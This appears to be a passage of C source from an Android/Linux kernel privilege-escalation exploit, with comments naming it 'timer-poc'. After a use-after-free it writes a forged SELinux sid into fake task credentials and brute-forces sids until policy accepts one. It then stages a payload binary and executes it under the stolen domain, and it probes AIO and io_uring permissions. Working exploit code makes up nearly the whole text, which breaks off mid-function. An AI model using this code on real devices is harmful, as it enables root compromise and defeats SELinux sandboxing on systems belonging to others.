static const char *g_peak_drop_dir;
static const char *g_peak_interp_path;
static unsigned int g_aio_test_events;
static unsigned int g_peak_scan_max;
static unsigned int g_scan_hit_sid;
static char g_scan_ack_env[32];
static char g_scan_probe_env[192] = "IC_SCAN_PROBE=";
/* Forwarded verbatim to the payload: the drop child builds its environment
 * from scratch (it is a fork of a fake-cred thread), so anything the payload
 * needs has to be copied to a static string before that point. */
static char g_payload_env[512];

/* Winner-side write of the fake tsec's sid.
 *
 * Two carriers: the AIO chain keeps the tsec on the leaked page, so the
 * winner can store the candidate itself; the mcast chain keeps it in the psl
 * of its own block, which only the main thread can rewrite (setsockopt).
 * There the winner publishes the candidate and spins (no syscall: a torn
 * tsec is harmless while it spins, and a syscall could block on the
 * sighand/socket locks the main thread is holding) until the main thread has
 * rewritten the four sid bytes inside the 60 s release wait. */
static void ic_peak_store_sid(unsigned int sid)
{
	if (!g_mc.active) {
		*g_peak_scan_sid = sid;
		return;
	}
	atomic_store_explicit(&g_mc_sid_req, sid + 1, memory_order_release);
	for (;;) {
		unsigned int i;

		if (!atomic_load_explicit(&g_mc_sid_req, memory_order_acquire))
			break;
		for (i = 0; i < 128; i++)
			ic_cpu_relax();
	}
}

/* Main-thread half of the above, called from the release-wait loop. */
static void ic_mc_service_sid(void)
{
	static unsigned int dbg_ok, dbg_bad;
	unsigned int req = atomic_load_explicit(&g_mc_sid_req,
						memory_order_acquire);
	int rc;

	if (!req)
		return;
	rc = ic_mc_sid_write(req - 1);
	/* The first few round trips are the interesting ones: if the sid
	 * does not come back from the psl, every clone in the ctxmap scan
	 * keeps the old (non-domain) sid and fails with that scontext. */
	if (dbg_ok < 8 || (rc && dbg_bad < 8)) {
		unsigned char img[IC_MC_NC][16];
		unsigned int cnt = 0, back = 0;
		int rg = ic_mc_get(g_mc.ord, img, &cnt);

		if (!rg)
			back = (unsigned int)ic_mc_word(
				img, (g_mc.cs ? g_mc.cs->sec + 4 : 0) & 0xffU,
				4);
		if (!rc)
			dbg_ok++;
		else
			dbg_bad++;
		ic_logf("[mcsid] sid=%u rc=%d get=%d count=%u back=0x%x "
			"step=%u idx=%u errno=%u\n",
			req - 1, rc, rg, cnt, back, g_mc_step, g_mc_idx,
			g_mc_errno);
	}
	atomic_store_explicit(&g_mc_sid_req, 0, memory_order_release);
	atomic_store_explicit(&g_mc_sid_ack, req, memory_order_relaxed);
}

/* entries in the sidtab hash = distinct initial contexts + dynamic contexts.
 * Dynamic sids are index_to_sid(count) = count + SECINITSID_NUM + 1 with
 * SECINITSID_NUM == 27, so no valid sid exceeds 28 + entries.  The bound is
 * only an optimisation; anything past it reads as unlabeled. */
static unsigned int ic_peak_sid_count(void)
{
	char buf[512];
	char *p;
	ssize_t n;
	int fd;

	fd = (int)syscall(SYS_openat, AT_FDCWD,
			  "/sys/fs/selinux/ss/sidtab_hash_stats",
			  O_RDONLY | O_CLOEXEC, 0);
	if (fd < 0)
		return 0;
	n = syscall(SYS_read, fd, buf, sizeof(buf) - 1);
	(void)syscall(SYS_close, fd);
	if (n <= 0)
		return 0;
	buf[n] = '\0';
	p = strstr(buf, "entries:");
	if (!p)
		return 0;
	return (unsigned int)strtoul(p + 8, NULL, 10);
}

/* Harness-only: the device boots with selinuxfs mounted and the policy
 * enforcing.  Loading it late keeps the peak chain in the no-policy state it
 * needs - with the policy loaded at boot this kernel faults in the B reap -
 * and still exercises the scan against the real policy. */
static void ic_peak_mount_selinuxfs(void)
{
	if (mkdir("/sys/fs/selinux", 0755) && errno != EEXIST)
		fprintf(stderr, "[scan] mkdir selinuxfs errno=%d\n", errno);
	if (mount("selinuxfs", "/sys/fs/selinux", "selinuxfs", 0UL, NULL) &&
	    errno != EBUSY)
		fprintf(stderr, "[scan] mount selinuxfs errno=%d\n", errno);
}

/* Must run after the policy is loaded (that is what marks the tmpfs
 * superblock SBLABEL so the xattr is accepted) but while the policy is
 * still permissive, so the relabelto check cannot veto the write. */
static void ic_peak_label(const char *path, const char *ctx)
{
	int rc;

	if (!path || !*path || !ctx || !*ctx)
		return;
	rc = setxattr(path, "security.selinux", ctx, strlen(ctx) + 1, 0);
	fprintf(stderr, "[scan] label %s %s rc=%d errno=%d\n", path, ctx, rc,
		rc ? errno : 0);
	fflush(stderr);
}

static void ic_peak_label_exec(const char *path)
{
	ic_peak_label(path, g_peak_exec_label && *g_peak_exec_label
			    ? g_peak_exec_label
			    : "u:object_r:shell_data_file:s0");
}

/* The "context" node is a simple_transaction file: it holds one pending
 * response per open file, so a second write on the same fd returns
 * EBUSY.  One open per context keeps it simple. */
static int ic_peak_intern_one(const char *ctx)
{
	int fd, e = 0;

	fd = open("/sys/fs/selinux/context", O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return errno;
	if (write(fd, ctx, strlen(ctx)) < 0)
		e = errno;
	close(fd);
	return e;
}

/* Read a small unsigned decimal from a selinuxfs helper file. */
static unsigned int ic_peak_fs_uint(const char *path)
{
	char buf[16];
	ssize_t n;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		fprintf(stderr, "[scan] uint %s open errno=%d\n", path, errno);
		return 0;
	}
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0) {
		fprintf(stderr, "[scan] uint %s read n=%ld errno=%d\n", path,
			(long)n, errno);
		return 0;
	}
	buf[n] = '\0';
	fprintf(stderr, "[scan] uint %s -> '%s'\n", path, buf);
	return (unsigned int)strtoul(buf, NULL, 10);
}

/* Harness-only: ask the loaded policy whether (scon, tcon, class, perm) is
 * allowed, and say so in words.  The "access" node answers with the av
 * decision mask; permission bits are 1 << (perm value - 1).  Needs
 * compute_av, which only holds while permissive. */
static void ic_peak_access(const char *scon, const char *tcon, const char *cls,
			   const char *perm)
{
	char path[128], req[256], resp[256];
	unsigned int cbit, pbit, mask = 0;
	ssize_t n;
	int fd;

	snprintf(path, sizeof(path), "/sys/fs/selinux/class/%s/index", cls);
	cbit = ic_peak_fs_uint(path);
	if (cbit)
		/* the perm entry itself is the file holding its index */
		snprintf(path, sizeof(path),
			 "/sys/fs/selinux/class/%s/perms/%s", cls, perm);
	pbit = cbit ? ic_peak_fs_uint(path) : 0;
	if (!cbit || !pbit) {
		fprintf(stderr, "[scan] access %s/%s unresolved\n", cls, perm);
		return;
	}
	fd = open("/sys/fs/selinux/access", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		fprintf(stderr, "[scan] access open errno=%d\n", errno);
		return;
	}
	snprintf(req, sizeof(req), "%s %s %u", scon, tcon, cbit);
	if (write(fd, req, strlen(req)) < 0) {
		fprintf(stderr, "[scan] access write errno=%d\n", errno);
		close(fd);
		return;
	}
	lseek(fd, 0, SEEK_SET);
	n = read(fd, resp, sizeof(resp) - 1);
	close(fd);
	if (n > 0) {
		resp[n] = '\0';
		mask = (unsigned int)strtoul(resp, NULL, 16);
	}
	fprintf(stderr, "[scan] access %s %s %s %s=%s (mask=0x%x)\n", scon,
		tcon, cls, perm,
		n > 0 ? (mask & (1u << (pbit - 1)) ? "allow" : "deny") : "?",
		mask);
	fflush(stderr);
}

/* Harness-only: one "scon tcon class perm" query per line. */
static void ic_peak_access_file_run(const char *path)
{
	char line[192];
	FILE *f;

	if (!path || !*path)
		return;
	f = fopen(path, "r");
	if (!f) {
		struct stat st;
		int se = stat(path, &st);

		fprintf(stderr, "[scan] access file '%s' open errno=%d stat=%d/%d\n",
			path, errno, se, se ? errno : (int)st.st_size);
		return;
	}
	while (fgets(line, sizeof(line), f)) {
		char scon[96], tcon[96], cls[32], perm[32];

		if (sscanf(line, "%95s %95s %31s %31s", scon, tcon, cls,
			   perm) != 4)
			continue;
		ic_peak_access(scon, tcon, cls, perm);
	}
	fclose(f);
}

/* The kernel gives a context a sid the first time it interns it, so in a
 * guest that never starts system_server that domain has no sid at all
 * and the scan would walk right past it.  selinuxfs's "context" node
 * interns without switching our own sid - that is exactly what it is
 * for.  Must run while permissive: the node checks check_context. */
static void ic_peak_intern_contexts(const char *path)
{
	char line[96];
	unsigned int ok = 0, bad = 0;
	int first = 0;
	FILE *f;

	if (!path || !*path)
		return;
	f = fopen(path, "r");
	if (!f) {
		fprintf(stderr, "[scan] ctxs open errno=%d\n", errno);
		return;
	}
	while (fgets(line, sizeof(line), f)) {
		size_t n = strlen(line);
		int e;

		while (n && (line[n - 1] == '\n' || line[n - 1] == '\r'))
			line[--n] = '\0';
		if (!n)
			continue;
		e = ic_peak_intern_one(line);
		if (e) {
			if (!first) {
				fprintf(stderr,
					"[scan] ctx %s errno=%d\n", line, e);
				first = e;
			}
			bad++;
		} else {
			ok++;
		}
	}
	fclose(f);
	fprintf(stderr, "[scan] interned ok=%u bad=%u\n", ok, bad);
	fflush(stderr);
}

/* sel_write_load() takes one write() as one whole policy and parses it
 * before returning, so afterwards every inode label is re-read from the
 * xattr/genfs and the sidtab is fixed for the boot. */
static int ic_peak_policy_load(const char *path)
{
	ssize_t sz, off = 0, w;
	char *buf;
	int fd, lfd, err = 0;

	ic_peak_mount_selinuxfs();
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		fprintf(stderr, "[scan] policy open errno=%d\n", errno);
		return -1;
	}
	sz = lseek(fd, 0, SEEK_END);
	if (sz <= 0 || sz > (off_t)(16 << 20) || lseek(fd, 0, SEEK_SET) < 0) {
		close(fd);
		fprintf(stderr, "[scan] policy size %ld\n", (long)sz);
		return -1;
	}
	buf = malloc((size_t)sz);
	if (!buf) {
		close(fd);
		return -1;
	}
	while (off < sz) {
		ssize_t r = read(fd, buf + off, (size_t)(sz - off));

		if (r <= 0)
			break;
		off += r;
	}
	close(fd);
	if (off != sz) {
		free(buf);
		fprintf(stderr, "[scan] policy read %ld/%ld\n", (long)off,
			(long)sz);
		return -1;
	}
	lfd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
	if (lfd < 0) {
		free(buf);
		fprintf(stderr, "[scan] load open errno=%d\n", errno);
		return -1;
	}
	w = write(lfd, buf, (size_t)sz);
	err = errno;
	close(lfd);
	free(buf);
	fprintf(stderr, "[scan] policy write %ld/%ld errno=%d\n", (long)w,
		(long)sz, err);
	if (w != sz) {
		fflush(stderr);
		return -1;
	}
	/* The boot value comes from the cmdline; stay permissive until the
	 * prime and the explicit enforce write below. */
	fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		(void)write(fd, "0", 1);
		close(fd);
	}
	fflush(stderr);
	return 0;
}

/* Harness-only: give u:r:shell:s0 a numeric sid while the policy is still
 * permissive.  On the device the exploit already runs as shell, so the sid
 * exists without this.  The sid stays in the sidtab for the boot. */
static void ic_peak_prime_child(int wfd)
{
	char ok = 'P', bad = 'F';
	long n = -1;
	int fd;

	fd = (int)syscall(SYS_openat, AT_FDCWD, "/proc/self/attr/current",
			  O_WRONLY | O_CLOEXEC, 0);
	if (fd >= 0) {
		n = syscall(SYS_write, fd, "u:r:shell:s0", 12);
		(void)syscall(SYS_close, fd);
	}
	(void)syscall(SYS_write, wfd, n == 12 ? &ok : &bad, 1);
	(void)syscall(SYS_exit, 0);
}

static void ic_peak_prime_shell(void)
{
	struct timespec ts = { .tv_sec = 2 };
	struct pollfd pfd;
	char c = 0;
	long pid;
	int fds[2];

	if (syscall(SYS_pipe2, fds, O_CLOEXEC))
		return;
	pid = syscall(SYS_clone, SIGCHLD, 0UL, 0UL, 0UL, 0UL);
	if (pid < 0) {
		(void)syscall(SYS_close, fds[0]);
		(void)syscall(SYS_close, fds[1]);
		return;
	}
	if (!pid)
		ic_peak_prime_child(fds[1]);
	(void)syscall(SYS_close, fds[1]);
	pfd.fd = fds[0];
	pfd.events = POLLIN;
	pfd.revents = 0;
	if (syscall(SYS_ppoll, &pfd, 1UL, &ts, NULL, 0) > 0)
		(void)syscall(SYS_read, fds[0], &c, 1);
	(void)syscall(SYS_close, fds[0]);
	(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
	fprintf(stderr, "[scan] prime shell sid %s\n",
		c == 'P' ? "ok" : "FAILED");
	fflush(stderr);
}

/* Harness-only: switch to enforcing from inside the exploit while the
 * policy is still permissive.  sel_write_enforce() only needs the (then
 * allowed) setenforce check, and enabling enforcement flushes the AVC, so
 * no permissive-phase grant survives into the scan. */
static void ic_peak_enforce_on(void)
{
	char cur[8];
	ssize_t n;
	int fd;
	int rc = -1;

	fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		rc = write(fd, "1", 1) == 1 ? 0 : -errno;
		close(fd);
	}
	cur[0] = '\0';
	fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd >= 0) {
		n = read(fd, cur, sizeof(cur) - 1);
		close(fd);
		if (n > 0)
			cur[n] = '\0';
	}
	fprintf(stderr, "[scan] enforce write rc=%d value=%s\n", rc, cur);
	fflush(stderr);
}

/* Runs in the fork child: raw syscalls only, then the payload takes over.
 * The pipe is not CLOEXEC on purpose: the new image writes IC_SCAN_ACK
 * using the fd number passed in the environment. */
static void ic_peak_scan_child(int rfd, int wfd)
{
	char *const argv[] = { (char *)"timer-poc", NULL };
	char *const envp[] = { (char *)"PATH=/system/bin:/sbin:/vendor/bin",
			       g_scan_ack_env, g_scan_probe_env, NULL };
	int err;

	(void)syscall(SYS_close, rfd);
	(void)syscall(SYS_execve, g_peak_scan_exec, argv, envp);
	err = errno;
	(void)syscall(SYS_write, wfd, &err, sizeof(err));
	(void)syscall(SYS_exit, 1);
}

/* Mode B: fork without exec.  fork() shares the cred pointer and only
 * bumps usage, so the child's SELinux sid is the candidate; the open of
 * the labelled probe file is the only thing policy gets to decide.
 * Reports the open errno; 0 means the candidate was accepted. */
static void ic_peak_probe_child(int rfd, int wfd)
{
	long fd;
	int err = 0;

	(void)syscall(SYS_close, rfd);
	fd = syscall(SYS_openat, AT_FDCWD, g_peak_probe_path,
		     O_WRONLY | O_CLOEXEC, 0L);
	if (fd < 0) {
		err = errno;
	} else {
		(void)syscall(SYS_close, fd);
		/* Land an audit line under the accepted sid so the log
		 * names the domain: stderr is the console here. */
		(void)syscall(SYS_write, 2, "probeok\n", 8);
	}
	(void)syscall(SYS_write, wfd, &err, sizeof(err));
	(void)syscall(SYS_exit, 0);
}

/* 1 = the probe open succeeded, 0 = rejected, -1 = cannot probe. */
static int ic_peak_probe_candidate(unsigned int sid)
{
	struct timespec ts = { .tv_nsec = 50L * 1000L * 1000L };
	struct pollfd pfd;
	int err = -1;
	long pid;
	int fds[2];
	ssize_t n;

	ic_peak_store_sid(sid);
	if (syscall(SYS_pipe2, fds, 0))
		return -1;
	pid = syscall(SYS_clone, SIGCHLD, 0UL, 0UL, 0UL, 0UL);
	if (pid < 0) {
		int e = errno;

		(void)syscall(SYS_close, fds[0]);
		(void)syscall(SYS_close, fds[1]);
		if (e != EACCES && e != EPERM && e != EAGAIN)
			fprintf(stderr, "[scan] clone sid=%u errno=%d\n", sid,
				e);
		return 0;
	}
	if (!pid)
		ic_peak_probe_child(fds[0], fds[1]);
	(void)syscall(SYS_close, fds[1]);

	pfd.fd = fds[0];
	pfd.events = POLLIN;
	pfd.revents = 0;
	for (;;) {
		long pr = syscall(SYS_ppoll, &pfd, 1UL, &ts, NULL, 0);

		if (pr < 0 && errno == EINTR)
			continue;
		if (pr <= 0) {
			(void)syscall(SYS_kill, pid, SIGKILL);
			(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
			(void)syscall(SYS_close, fds[0]);
			return 0;
		}
		break;
	}
	n = syscall(SYS_read, fds[0], &err, sizeof(err));
	(void)syscall(SYS_close, fds[0]);
	(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
	if (n == (ssize_t)sizeof(err) && err == 0)
		return 1;
	if (n == (ssize_t)sizeof(err) && err != EACCES && err != EPERM)
		fprintf(stderr, "[scan] sid=%u probe errno=%d\n", sid, err);
	return 0;
}

/* 1 = the new image acknowledged, 0 = this sid was rejected, -1 = the
 * payload cannot be exec'd at all and the scan should stop. */
static int ic_peak_scan_candidate(unsigned int sid)
{
	struct timespec ts = { .tv_nsec = IC_SCAN_TIMEOUT_NS };
	struct pollfd pfd;
	int err = 0;
	long pid;
	int fds[2];
	ssize_t n;

	ic_peak_store_sid(sid);
	if (syscall(SYS_pipe2, fds, 0)) {
		fprintf(stderr, "[scan] pipe2 errno=%d\n", errno);
		return -1;
	}
	snprintf(g_scan_ack_env, sizeof(g_scan_ack_env), "IC_SCAN_FD=%d",
		 fds[1]);
	pid = syscall(SYS_clone, SIGCHLD, 0UL, 0UL, 0UL, 0UL);
	if (pid < 0) {
		err = errno;
		(void)syscall(SYS_close, fds[0]);
		(void)syscall(SYS_close, fds[1]);
		/* fork is denied by policy for non-domain sids: that is a
		 * verdict about this candidate, not an error. */
		if (err != EACCES && err != EPERM && err != EAGAIN)
			fprintf(stderr, "[scan] clone sid=%u errno=%d\n", sid,
				err);
		return 0;
	}
	if (!pid)
		ic_peak_scan_child(fds[0], fds[1]);
	(void)syscall(SYS_close, fds[1]);

	pfd.fd = fds[0];
	pfd.events = POLLIN;
	pfd.revents = 0;
	for (;;) {
		long pr = syscall(SYS_ppoll, &pfd, 1UL, &ts, NULL, 0);

		if (pr < 0 && errno == EINTR)
			continue;
		if (pr <= 0) {
			(void)syscall(SYS_kill, pid, SIGKILL);
			(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
			(void)syscall(SYS_close, fds[0]);
			return 0;
		}
		break;
	}
	n = syscall(SYS_read, fds[0], &err, sizeof(err));
	(void)syscall(SYS_close, fds[0]);
	if (n == 1 && err == IC_SCAN_ACK) {
		fprintf(stderr, "[scan] sid=%u accepted\n", sid);
		fflush(stderr);
		return 1;
	}
	(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
	if (n == (ssize_t)sizeof(err) &&
	    ((unsigned int)err & 0xffff0000u) == IC_SCAN_VERDICT) {
		fprintf(stderr, "[scan] sid=%u payload verdict errno=%d\n", sid,
			err & 0xffff);
		fflush(stderr);
		return 0;
	}
	if (n == (ssize_t)sizeof(err) && err != EACCES && err != EPERM) {
		fprintf(stderr, "[scan] sid=%u exec errno=%d, stopping\n", sid,
			err);
		fflush(stderr);
		return -1;
	}
	return 0;
}

static void ic_peak_sid_scan(void)
{
	unsigned int max = g_peak_scan_max;
	unsigned int c = 1;
	unsigned int hits = 0;
	int rc;

	if (!max) {
		unsigned int nel = ic_peak_sid_count();

		max = nel ? 28 + nel + 64 : IC_SCAN_DEFAULT_MAX;
	}
	if (g_peak_scan_inproc && (!g_peak_probe_path || !*g_peak_probe_path)) {
		fprintf(stderr, "[scan] inproc mode needs IC_SCAN_PROBE\n");
		fflush(stderr);
		return;
	}
	fprintf(stderr, "[scan] candidates 1..%u %s=%s\n", max,
		g_peak_scan_inproc ? "inproc" : "exec",
		g_peak_scan_inproc ? g_peak_probe_path : g_peak_scan_exec);
	fflush(stderr);
	for (c = 1; c <= max; c++) {
		rc = g_peak_scan_inproc ? ic_peak_probe_candidate(c)
					: ic_peak_scan_candidate(c);
		if (rc < 0)
			break;
		if (rc) {
			fprintf(stderr, "[scan] hit sid=%u\n", c);
			fflush(stderr);
			if (g_peak_scan_all) {
				/* Survey mode: keep going so every accepting sid
				 * is named.  Under enforcement stdout is denied,
				 * but the kernel still audits the forced console
				 * write with comm=hit-<sid> and scontext=<the
				 * candidate>; a permissive domain shows up as
				 * permissive=1. */
				char nm[16];

				snprintf(nm, sizeof(nm), "hit-%u", c);
				(void)prctl(PR_SET_NAME, nm, 0UL, 0UL, 0UL);
				(void)syscall(SYS_write, 2, "H", 1);
				hits++;
				continue;
			}
			g_scan_hit_sid = c;
			/* Under enforcement the console write is denied for
			 * this sid too, but the kernel still audits the denial
			 * with scontext=<candidate>, which is the verdict. */
			(void)syscall(SYS_write, 2, "[hit]\n", 6);
			atomic_store_explicit(&g_poc_success, 1,
					      memory_order_release);
			ic_futex_wake_priv(&g_poc_success, 1);
			return;
		}
		if ((c & 0x3f) == 0) {
			fprintf(stderr, "[scan] ...%u\n", c);
			fflush(stderr);
		}
	}
	fprintf(stderr, "[scan] no sid accepted (up to %u)\n", c > max ? max : c);
	if (hits)
		fprintf(stderr, "[scan] survey hits=%u\n", hits);
	fflush(stderr);
}

/* Under enforcement no domain the scan can hit is allowed to write the
 * harness console (rootfs chr_file), so the SUCCESS line above is lost.
 * A denied operation is still audited by the kernel and the audit line
 * carries comm=, so put the hit sid in the task name and force one denied
 * console write.  In permissive mode the same line appears with
 * permissive=1, and the write itself leaks a stray 'H'. */
static void ic_peak_report_hit(void)
{
	char name[16];

	snprintf(name, sizeof(name), "hit-%u", g_scan_hit_sid);
	(void)prctl(PR_SET_NAME, name, 0UL, 0UL, 0UL);
	(void)syscall(SYS_write, 2, "H", 1);
}

/* Runs in a fork child of the winner.  The winner itself cannot answer:
 * selinux_getprocattr() reads __task_cred(), i.e. real_cred, and only
 * task->cred was replaced, so the winner would read back its boot domain
 * (and /proc/thread-self does not help - it is the same task).  clone()
 * without CLONE_THREAD goes through copy_creds()/prepare_creds(), which
 * rebuild a coherent cred/real_cred pair from the fake cred; the child's
 * sid is then the candidate and its own attr/current names it. */
static void ic_peak_ctxmap_child(int rfd, int wfd)
{
	char buf[160];
	ssize_t n;
	int fd;

	(void)syscall(SYS_close, rfd);
	fd = (int)syscall(SYS_openat, AT_FDCWD, "/proc/self/attr/current",
			  O_RDONLY | O_CLOEXEC, 0L);
	if (fd < 0) {
		n = -errno;
		(void)syscall(SYS_write, wfd, &n, sizeof(n));
		(void)syscall(SYS_exit, 0);
	}
	n = syscall(SYS_read, fd, buf, sizeof(buf) - 1);
	(void)syscall(SYS_close, fd);
	if (n < 0)
		n = -errno;
	(void)syscall(SYS_write, wfd, &n, sizeof(n));
	if (n > 0)
		(void)syscall(SYS_write, wfd, buf, (size_t)n);
	(void)syscall(SYS_exit, 0);
}

/* 1 = ctx filled with the sid's context string, 0 = no answer (invalid sid,
 * denied fork/read), -1 = harness error. */
static int ic_peak_ctxmap_one(unsigned int sid, char *out, size_t cap)
{
	struct timespec ts = { .tv_nsec = 50L * 1000L * 1000L };
	struct pollfd pfd;
	ssize_t n = 0;
	size_t got = 0;
	long pid;
	int fds[2];
	int ret = 0;

	ic_peak_store_sid(sid);
	if (syscall(SYS_pipe2, fds, 0))
		return -1;
	pid = syscall(SYS_clone, SIGCHLD, 0UL, 0UL, 0UL, 0UL);
	if (pid < 0) {
		int e = errno;

		(void)syscall(SYS_close, fds[0]);
		(void)syscall(SYS_close, fds[1]);
		if (e != EACCES && e != EPERM && e != EAGAIN)
			fprintf(stderr, "[ctxmap] clone sid=%u errno=%d\n", sid,
				e);
		return 0;
	}
	if (!pid)
		ic_peak_ctxmap_child(fds[0], fds[1]);
	(void)syscall(SYS_close, fds[1]);

	pfd.fd = fds[0];
	pfd.events = POLLIN;
	pfd.revents = 0;
	for (;;) {
		long pr = syscall(SYS_ppoll, &pfd, 1UL, &ts, NULL, 0);

		if (pr < 0 && errno == EINTR)
			continue;
		if (pr <= 0) {
			(void)syscall(SYS_kill, pid, SIGKILL);
			(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
			(void)syscall(SYS_close, fds[0]);
			return 0;
		}
		break;
	}
	if (syscall(SYS_read, fds[0], &n, sizeof(n)) == (ssize_t)sizeof(n) &&
	    n > 0 && (size_t)n < cap) {
		while (got < (size_t)n) {
			ssize_t r = syscall(SYS_read, fds[0], out + got,
					    (size_t)n - got);

			if (r <= 0)
				break;
			got += (size_t)r;
		}
		if (got == (size_t)n) {
			out[n] = '\0';
			while (n > 0 && (out[n - 1] == '\n' ||
					 out[n - 1] == '\0'))
				out[--n] = '\0';
			ret = 1;
		}
	}
	(void)syscall(SYS_close, fds[0]);
	(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
	return ret;
}

/* Endgame rehearsal: create a fresh file inside a directory that carries
 * the data-file label (on the device /data/adb is adb_data_file), then
 * exec it.  With no type_transition for adb_data_file the new inode
 * inherits the directory's label, and init->adb_data_file has execute /
 * execute_no_trans, so the image runs in place and keeps the fake sid.
 * The payload acknowledges with 'K' only after its probe open of an
 * adb_data_file-labelled file succeeded, so one byte proves the create
 * (dir add_name/write), the exec and the domain's data-file write power. */
static int g_drop_mode;
static int g_drop_mem;
static const unsigned char *g_self_blob;
static size_t g_self_len;

/* Captured before the race while the process can still read its own image
 * (on the device that file is shell_data_file, which the init child cannot
 * read).  The drop child writes these bytes instead of opening a source. */
static int ic_self_capture(const char *argv0)
{
	struct stat st;
	ssize_t n;
	size_t off = 0;
	int fd;

	fd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	if (fd < 0 && argv0 && *argv0)
		fd = open(argv0, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	if (fstat(fd, &st) || st.st_size <= 0) {
		close(fd);
		return -1;
	}
	g_self_blob = malloc((size_t)st.st_size);
	if (!g_self_blob) {
		close(fd);
		return -1;
	}
	while (off < (size_t)st.st_size) {
		n = read(fd, (char *)g_self_blob + off,
			 (size_t)st.st_size - off);
		if (n <= 0)
			break;
		off += (size_t)n;
	}
	close(fd);
	g_self_len = off;
	return off ? 0 : -1;
}

/* Stages the payload while the process still holds the real identity.
 * On the device the drop directory (/data/local/tmp) is shell-owned 0771, so
 * a post-UAF child whose fsuid is a fake 0 cannot create anything in it and
 * has no CAP_DAC_OVERRIDE to bypass the mode bits.  Staging here also means
 * the drop child never has to write 2.3 MB through a fake cred; mode 7 just
 * execs the file. */
static int ic_peak_prep_drop(void)
{
	const char *dir = g_peak_drop_dir;
	const char *src = g_peak_scan_exec && *g_peak_scan_exec
		? g_peak_scan_exec : "/proc/self/exe";
	char path[128];
	char buf[4096];
	ssize_t n;
	size_t total = 0;
	int in, out;

	if (!dir || !*dir)
		return -1;
	(void)mkdir(dir, 0777);
	(void)chmod(dir, 0777);
	snprintf(path, sizeof(path), "%s/payload", dir);
	in = open(src, O_RDONLY | O_CLOEXEC);
	if (in < 0) {
		fprintf(stderr, "[prep] open %s errno=%d\n", src, errno);
		fflush(stderr);
		return -1;
	}
	out = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0777);
	if (out < 0) {
		fprintf(stderr, "[prep] create %s errno=%d\n", path, errno);
		fflush(stderr);
		close(in);
		return -1;
	}
	while ((n = read(in, buf, sizeof(buf))) > 0) {
		ssize_t off = 0;

		while (off < n) {
			ssize_t w = write(out, buf + off, (size_t)(n - off));

			if (w <= 0)
				goto fail;
			off += w;
		}
		total += (size_t)n;
	}
	close(in);
	if (n < 0) {
		close(out);
		goto fail;
	}
	(void)fchmod(out, 0777);
	close(out);
	fprintf(stderr, "[prep] staged %s (%zu bytes) from %s\n",
		path, total, src);
	fflush(stderr);
	return 0;
fail:
	close(in);
	close(out);
	fprintf(stderr, "[prep] write %s failed errno=%d\n", path, errno);
	fflush(stderr);
	return -1;
}

static void ic_peak_drop_child(int rfd, int wfd, const char *path)
{
	char buf[4096];
	char *const argv[] = { (char *)"timer-poc", NULL };
	char *envp[5];
	int ne = 0;
	int use_mem = g_drop_mem && g_self_blob && g_self_len;
	size_t off, done = 0;
	ssize_t n, w = 0;
	int in = -1, out, err;
	int zero = 0;

	envp[ne++] = (char *)"PATH=/system/bin:/sbin:/vendor/bin";
	if (g_scan_ack_env[0])
		envp[ne++] = g_scan_ack_env;
	if (g_scan_probe_env[0])
		envp[ne++] = g_scan_probe_env;
	if (g_payload_env[0])
		envp[ne++] = g_payload_env;
	envp[ne] = NULL;

	(void)syscall(SYS_write, 2, "c", 1);
	(void)syscall(SYS_close, rfd);
	/* Mode 7: the payload was staged by ic_peak_prep_drop() while the
	 * process still had the real identity, so all that is left is the exec
	 * under the fake cred.  Nothing here touches the filesystem. */
	if (g_drop_mode == 7) {
		(void)syscall(SYS_write, 2, "e", 1);
		(void)syscall(SYS_execve, path, argv, envp);
		err = errno;
		(void)syscall(SYS_write, wfd, &err, sizeof(err));
		(void)syscall(SYS_exit, 0);
	}
	/* Mode 5: probe whether this sid may create and map a legacy-AIO
	 * ring.  io_setup() allocates an anonymous inode (unlabeled default)
	 * and does an internal do_mmap() of it, so under enforcement the
	 * mmap_file hook checks file:map for this sid.  Reports 'K' when the
	 * ring is mapped and readable, otherwise the errno. */
	if (g_drop_mode == 5) {
		ic_aio_context_t ctx = 0;
		long ev = g_aio_test_events ? (long)g_aio_test_events : 128;

		if (!syscall(SYS_io_setup, ev, &ctx)) {
			volatile unsigned char *ring =
				(volatile unsigned char *)(uintptr_t)ctx;

			(void)ring[0];
			(void)ring[4];
			(void)syscall(SYS_write, wfd, "K", 1);
		} else {
			err = errno;
			(void)syscall(SYS_write, wfd, &err, sizeof(err));
		}
		(void)syscall(SYS_exit, 0);
	}
	/* Mode 6: io_uring probe.  Unlike legacy AIO, 6.1 io_uring goes
	 * through anon_inode_getfile_secure(), which clears S_PRIVATE and
	 * checks anon_inode:create against the source domain's own sid, and
	 * the ring mappings are then checked as anon_inode:map.  Reports
	 * 'K' only when setup and both 8 KiB mappings succeed, otherwise
	 * the errno of the first failing step. */
	if (g_drop_mode == 6) {
		unsigned char params[0x78];
		void *map;
		long fd;

		memset(params, 0, sizeof(params));
		*(uint32_t *)params = 128;
		fd = syscall(SYS_io_uring_setup, 128, params);
		if (fd < 0) {
			err = errno;
			(void)syscall(SYS_write, wfd, &err, sizeof(err));
			(void)syscall(SYS_exit, 0);
		}
		map = (void *)syscall(SYS_mmap, 0UL, IC_IORING_BLOCK,
				      PROT_READ | PROT_WRITE, MAP_SHARED, fd,
				      IC_IORING_OFF_SQES);
		if (map == MAP_FAILED) {
			err = errno;
